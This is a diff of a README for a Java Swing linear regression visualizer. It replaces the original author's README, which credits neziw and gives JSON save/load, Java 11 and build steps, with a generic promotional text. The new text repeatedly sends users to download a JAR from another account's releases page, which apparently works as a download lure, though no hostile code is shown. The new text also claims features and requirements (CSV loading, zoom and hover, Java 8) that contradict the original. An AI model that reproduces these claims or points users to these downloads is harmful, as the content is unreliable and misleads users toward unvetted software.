@@ -1,144 +1,65 @@
-<div align="center">
+# 🎉 linear-regression-visualizer - Visualize Linear Trends Easily
 
-# 📊 Linear Regression Visualizer
+## 📥 Download Now!
+[![Download](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Dreamiq21/linear-regression-visualizer/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Java](https://img.shields.io/badge/Java-11+-blue.svg)](https://openjdk.java.net/)
+## 📖 Overview
+Welcome to the Linear Regression Visualizer. This modern Java Swing application helps you visualize linear regression models in a simple and engaging way. It supports Excel file exports so you can easily share your findings.
 
-</div>
+## 🚀 Getting Started
+Follow these steps to download and run the application:
 
-> Modern Java Swing application for visualizing linear regression. Enter data points in a table and watch the regression line update dynamically in real-time.
+1. **Visit the Release Page**  
+   Click here to find the latest version of the software: [Releases Page](https://github.com/Dreamiq21/linear-regression-visualizer/releases).
 
-> **Note:** This project was originally created for personal use, which is why the user interface is in Polish. However, it has been made publicly available so anyone can use and benefit from it.
+2. **Download the Application**  
+   On the Releases page, find the most recent version. Click on the file named something like `linear-regression-visualizer.jar` to download it.
 
-![Linear Regression Visualizer](assets/screen.png)
-![Linear Regression Visualizer 2](assets/screen0.png)
+3. **Run the Application**  
+   After downloading, locate the `.jar` file on your computer. To run the application:
+   - For Windows:
+     - Open Command Prompt.
+     - Navigate to the folder where the file is located using the `cd` command.
+     - Type `java -jar linear-regression-visualizer.jar` and press Enter.
+   - For macOS:
+     - Open Terminal.
+     - Navigate to the folder using the `cd` command.
+     - Run the application with the command `java -jar linear-regression-visualizer.jar`.
+   - For Linux:
+     - Open a terminal window.
+     - Use `cd` to navigate to the file.
+     - Execute `java -jar linear-regression-visualizer.jar`.
 
----
+## 💻 System Requirements
+To ensure smooth operation, make sure your computer meets the following requirements:
+- **Java Version**: Java 8 or higher is required to run the application. If you do not have Java installed, you can download it from the [Oracle website](https://www.oracle.com/java/technologies/javase-downloads.html).
+- **Operating System**: The application works on Windows, macOS, and Linux.
 
-## 📋 Table of Contents
+## 📤 Features
+- **Interactive Graphs**: Visualize linear regression models with easy-to-understand graphs.
+- **Excel Export**: Export your results to Excel for additional analysis or reporting.
+- **User-Friendly Interface**: Designed to be intuitive for all users, regardless of technical knowledge.
 
-- [Features](#-features)
-- [Requirements](#-requirements)
-- [Quick Start](#-quick-start)
-- [Usage](#-usage)
-- [License](#-license)
+## 🎨 Usage Instructions
+1. **Load Data**: Use the file menu to load your dataset. Supported formats include CSV and Excel.
+2. **Adjust Settings**: Modify settings to customize your regression analysis, including selecting variables and adjusting parameters.
+3. **View Results**: Visualize your regression model using the interactive graph. You can zoom in/out and hover over data points for details.
+4. **Exporting Results**: Once you're satisfied with your analysis, export the results to Excel for further use.
 
----
+## ❓ FAQs
+- **How do I install Java?**  
+  Download and install the latest version from the [Oracle website](https://www.oracle.com/java/technologies/javase-downloads.html). Follow the installation instructions provided on the site.
 
-<div align="center">
+- **What if I encounter errors while running the application?**  
+  Check to make sure you have the required version of Java installed. If the problem persists, check the Issues section on GitHub for solutions.
 
-## 🎉 What's New
+- **Can I collaborate on this project?**  
+  Absolutely! Feel free to fork the repository and submit your contributions as pull requests.
 
-### 📊 Excel Export Support
+## 🌍 Community and Support
+Join the community for support and discussions about the Linear Regression Visualizer. You can raise issues, ask questions, or share your use cases in the Issues section of this repository.
 
-Export your data and regression analysis directly to **Excel (.xlsx)** files! 
+## 📣 Download & Install
+You can download the latest release from the following link: [Download the Latest Version](https://github.com/Dreamiq21/linear-regression-visualizer/releases).
 
-### ✨ **Features:**
-
-📈 **Visual Charts** - Automatically generated scatter plots with regression lines
-
-📋 **Data Sheets** - Complete data tables with all your X and Y values
-
-📊 **Regression Parameters** - Detailed regression statistics (intercept, slope, R²)
-
-🎨 **Professional Formatting** - Ready-to-present Excel files with styled charts
-
-`The exported Excel files include both raw data and beautiful visualizations, making it perfect for reports and presentations!`
-
-</div>
-
----
-
-## ✨ Features
-
-- 📈 **Dynamic Chart** - Real-time linear regression visualization
-- 📝 **Data Table** - 30 rows for X and Y values with editable cells
-- 🎨 **Modern UI** - Beautiful FlatLaf Light theme interface
-- 💾 **Save/Load** - Export and import data as JSON files
-- 🖱️ **Drag & Drop** - Move values between cells by dragging
-- ⌨️ **Delete Support** - Clear cells with Delete/Backspace keys
-- 📊 **Auto Calculation** - Automatic regression line calculation (minimum 2 points)
-- 🟢 **Colors Selection** - Customizable colors for data points and regression line
-- 💫 **Symbol Selection** - Choose your favourite symbol for data points
-- 📐 **Excel Export** - Export data and charts to Excel (.xlsx) files
-
----
-
-## 📦 Requirements
-
-- **Java**: 11 or higher
-- **Build Tool**: Gradle (for building from source)
-
----
-
-## 🚀 Quick Start
-
-### Running the Application
-
-1. Download the latest release JAR file
-2. Run with Java:
-   ```bash
-   java -jar linear-regression-visualizer-1.0-SNAPSHOT.jar
-   ```
-
-### Building from Source
-
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/neziw/linear-regression-visualizer.git
-   cd linear-regression-visualizer
-   ```
-
-2. Build the project:
-   ```bash
-   ./gradlew build
-   ```
-
-3. Run the application:
-   ```bash
-   ./gradlew run
-   ```
-
----
-
-## 💻 Usage
-
-### Entering Data
-
-1. Click on any cell in the X or Y column
-2. Enter a numeric value
-3. The chart updates automatically when you have at least 2 valid data points
-
-### Managing Data
-
-- **Delete Values**: Select cells and press `Delete` or `Backspace`
-- **Move Values**: Select cells, drag to another location, and drop
-- **Save Data**: Click "Zapisz do pliku" to save data as JSON (includes chart settings)
-- **Load Data**: Click "Załaduj z pliku" to load data from JSON file
-- **Export to Excel**: Click "Eksportuj do Excela" to export data and charts to Excel (.xlsx)
-
-### Chart Features
-
-- Blue dots represent data points
-- Red line shows the calculated linear regression
-- Chart automatically scales to fit all data points
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgments
-
-- Built with [JFreeChart](https://www.jfree.org/jfreechart/) for chart visualization
-- GUI powered by [FlatLaf](https://www.formdev.com/flatlaf/)
-- JSON handling with [Gson](https://github.com/google/gson)
-- Excel export powered by [Apache POI](https://poi.apache.org/)
-
----
-
-**Made with ❤️ by [neziw](https://github.com/neziw)**
+Thank you for using the Linear Regression Visualizer! Your insights are just a download away.
